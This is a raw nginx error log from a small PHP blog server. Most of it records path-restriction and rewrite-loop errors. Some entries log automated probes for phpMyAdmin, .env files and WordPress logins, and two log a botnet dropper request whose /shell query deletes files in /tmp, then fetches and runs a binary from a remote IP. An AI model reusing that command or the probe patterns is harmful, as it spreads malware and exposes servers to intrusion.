2020/07/08 14:17:28 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:03 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:04 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:20:28 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:19 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:20 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:21 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 23:08:47 [error] 6#6: *163 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//sdk", client: 101.133.147.20, server: yhlbk.com, request: "POST /sdk HTTP/1.1", host: "120.77.171.251"
2020/07/09 00:14:59 [error] 6#6: *170 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//static/js/common.js", client: 39.99.251.41, server: yhlbk.com, request: "GET /static/js/common.js HTTP/1.1", host: "yhlbk.com"
2020/07/09 01:35:41 [error] 6#6: *177 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 157.55.39.27, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "yhlbk.com"
2020/07/09 01:54:06 [error] 6#6: *180 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.15, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 01:54:06 [error] 6#6: *181 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.15, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 01:54:06 [error] 6#6: *182 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.207.15, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 03:56:27 [error] 6#6: *198 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 221.1.221.37, server: yhlbk.com, request: "GET /app/member/show/Json/BaseBall.php?leaguename=1 HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "120.77.171.251"
2020/07/09 04:52:31 [error] 6#6: *202 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.219.51, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 04:52:31 [error] 6#6: *203 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.219.51, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 04:52:31 [error] 6#6: *204 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.219.51, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 04:53:33 [error] 6#6: *206 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 89.248.172.90, server: yhlbk.com, request: "GET http://httpheader.net/azenv.php HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "httpheader.net"
2020/07/09 04:53:51 [error] 6#6: *211 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpmyadmin/", client: 222.191.175.36, server: yhlbk.com, request: "GET /phpmyadmin/ HTTP/1.1", host: "120.77.171.251"
2020/07/09 05:15:44 [error] 6#6: *229 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//english/", client: 221.213.75.2, server: yhlbk.com, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
2020/07/09 07:44:54 [error] 6#6: *249 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.61, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 07:44:54 [error] 6#6: *250 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.61, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 07:44:54 [error] 6#6: *251 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.61, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 08:04:24 [error] 6#6: *257 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 178.154.200.68, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "yhlbk.com"
2020/07/09 08:12:28 [error] 6#6: *260 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 157.55.39.27, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "yhlbk.com"
2020/07/09 09:15:16 [error] 6#6: *272 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//cache/global/img/gs.gif", client: 80.82.70.187, server: yhlbk.com, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
2020/07/09 11:46:49 [error] 6#6: *5 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//shell", client: 102.42.6.69, server: yhlbk.com, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1", host: "127.0.0.1:80"
2020/07/09 11:46:50 [error] 6#6: *3 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//shell", client: 102.42.6.69, server: yhlbk.com, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1", host: "127.0.0.1:80"
2020/07/09 11:49:24 [error] 6#6: *7 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//explicit_not_exist_path", client: 101.133.138.59, server: yhlbk.com, request: "GET /explicit_not_exist_path HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:25 [error] 6#6: *9 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.html", client: 101.133.138.59, server: yhlbk.com, request: "GET /index.html HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:26 [error] 6#6: *10 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.jsp", client: 101.133.138.59, server: yhlbk.com, request: "GET /index.jsp HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:26 [error] 6#6: *12 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//admin/", client: 101.133.138.59, server: yhlbk.com, request: "GET /admin/ HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:27 [error] 6#6: *13 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 101.133.138.59, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:27 [error] 6#6: *14 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php/explicit_not_exist_path", client: 101.133.138.59, server: yhlbk.com, request: "GET /index.php/explicit_not_exist_path HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:27 [error] 6#6: *15 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//static/.gitignore", client: 101.133.138.59, server: yhlbk.com, request: "GET /static/.gitignore HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:28 [error] 6#6: *16 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//4e5e5d7364f443e28fbf0d3ae744a59a", client: 101.133.138.59, server: yhlbk.com, request: "GET /4e5e5d7364f443e28fbf0d3ae744a59a HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:28 [error] 6#6: *17 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/img/prompt.jpg", client: 101.133.138.59, server: yhlbk.com, request: "GET /r/cms/www/red/img/prompt.jpg HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:28 [error] 6#6: *19 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/style/swiper.min.js", client: 101.133.138.59, server: yhlbk.com, request: "GET /r/cms/www/red/style/swiper.min.js HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:28 [error] 6#6: *20 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wcm/", client: 101.133.138.59, server: yhlbk.com, request: "GET /wcm/ HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:28 [error] 6#6: *21 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpMyAdmin/", client: 101.133.138.59, server: yhlbk.com, request: "GET /phpMyAdmin/ HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 11:49:28 [error] 6#6: *22 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpmyadmin/", client: 101.133.138.59, server: yhlbk.com, request: "GET /phpmyadmin/ HTTP/1.1", host: "www.yhlbk.com"
2020/07/09 12:50:27 [error] 6#6: *25 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//explicit_not_exist_path", client: 47.103.69.54, server: yhlbk.com, request: "GET /explicit_not_exist_path HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:27 [error] 6#6: *27 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.html", client: 47.103.69.54, server: yhlbk.com, request: "GET /index.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:28 [error] 6#6: *28 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.jsp", client: 47.103.69.54, server: yhlbk.com, request: "GET /index.jsp HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:28 [error] 6#6: *30 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//admin/", client: 47.103.69.54, server: yhlbk.com, request: "GET /admin/ HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:29 [error] 6#6: *31 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 47.103.69.54, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:29 [error] 6#6: *32 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php/explicit_not_exist_path", client: 47.103.69.54, server: yhlbk.com, request: "GET /index.php/explicit_not_exist_path HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:29 [error] 6#6: *33 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//static/.gitignore", client: 47.103.69.54, server: yhlbk.com, request: "GET /static/.gitignore HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:30 [error] 6#6: *34 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//4e5e5d7364f443e28fbf0d3ae744a59a", client: 47.103.69.54, server: yhlbk.com, request: "GET /4e5e5d7364f443e28fbf0d3ae744a59a HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:30 [error] 6#6: *35 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/img/prompt.jpg", client: 47.103.69.54, server: yhlbk.com, request: "GET /r/cms/www/red/img/prompt.jpg HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:30 [error] 6#6: *37 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/style/swiper.min.js", client: 47.103.69.54, server: yhlbk.com, request: "GET /r/cms/www/red/style/swiper.min.js HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:30 [error] 6#6: *38 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wcm/", client: 47.103.69.54, server: yhlbk.com, request: "GET /wcm/ HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:30 [error] 6#6: *39 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpMyAdmin/", client: 47.103.69.54, server: yhlbk.com, request: "GET /phpMyAdmin/ HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:50:30 [error] 6#6: *40 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//phpmyadmin/", client: 47.103.69.54, server: yhlbk.com, request: "GET /phpmyadmin/ HTTP/1.1", host: "yhlbk.com"
2020/07/09 12:54:02 [error] 6#6: *41 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//.env", client: 54.166.197.134, server: yhlbk.com, request: "GET /.env HTTP/1.1", host: "120.77.171.251"
2020/07/09 13:34:35 [error] 6#6: *46 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//portal/redlion", client: 192.241.231.53, server: yhlbk.com, request: "GET /portal/redlion HTTP/1.1", host: "120.77.171.251"
2020/07/09 14:03:59 [error] 6#6: *54 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 14:03:59 [error] 6#6: *55 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 14:03:59 [error] 6#6: *56 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/09 14:26:06 [error] 6#6: *59 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//explicit_not_exist_path", client: 101.132.161.137, server: yhlbk.com, request: "GET /explicit_not_exist_path HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:07 [error] 6#6: *61 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.html", client: 101.132.161.137, server: yhlbk.com, request: "GET /index.html HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:07 [error] 6#6: *62 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.jsp", client: 101.132.161.137, server: yhlbk.com, request: "GET /index.jsp HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:07 [error] 6#6: *64 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//admin/", client: 101.132.161.137, server: yhlbk.com, request: "GET /admin/ HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:08 [error] 6#6: *65 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 101.132.161.137, server: yhlbk.com, request: "GET /wp-login.php HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "m.yhlbk.com"
2020/07/09 14:26:08 [error] 6#6: *65 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//readme.html", client: 101.132.161.137, server: yhlbk.com, request: "GET /readme.html HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:08 [error] 6#6: *67 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//license.txt", client: 101.132.161.137, server: yhlbk.com, request: "GET /license.txt HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:08 [error] 6#6: *68 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-includes/js/wplink.js", client: 101.132.161.137, server: yhlbk.com, request: "GET /wp-includes/js/wplink.js HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:08 [error] 6#6: *69 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-admin/js/customize-controls.js", client: 101.132.161.137, server: yhlbk.com, request: "GET /wp-admin/js/customize-controls.js HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:08 [error] 6#6: *70 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-admin/js/nav-menu.js", client: 101.132.161.137, server: yhlbk.com, request: "GET /wp-admin/js/nav-menu.js HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:08 [error] 6#6: *71 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-includes/js/plupload/handlers.js", client: 101.132.161.137, server: yhlbk.com, request: "GET /wp-includes/js/plupload/handlers.js HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *72 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wp-includes/js/tinymce/wp-tinymce.js.gz", client: 101.132.161.137, server: yhlbk.com, request: "GET /wp-includes/js/tinymce/wp-tinymce.js.gz HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *73 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 101.132.161.137, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *74 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php/explicit_not_exist_path", client: 101.132.161.137, server: yhlbk.com, request: "GET /index.php/explicit_not_exist_path HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *75 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//static/.gitignore", client: 101.132.161.137, server: yhlbk.com, request: "GET /static/.gitignore HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *76 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//4e5e5d7364f443e28fbf0d3ae744a59a", client: 101.132.161.137, server: yhlbk.com, request: "GET /4e5e5d7364f443e28fbf0d3ae744a59a HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *77 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/img/prompt.jpg", client: 101.132.161.137, server: yhlbk.com, request: "GET /r/cms/www/red/img/prompt.jpg HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *79 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//r/cms/www/red/style/swiper.min.js", client: 101.132.161.137, server: yhlbk.com, request: "GET /r/cms/www/red/style/swiper.min.js HTTP/1.1", host: "m.yhlbk.com"
2020/07/09 14:26:09 [error] 6#6: *80 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//wcm/", client: 101.132.161.137, server: yhlbk.com, request: "GET /wcm/ HTTP/1.1", host: "m.yhlbk.com"
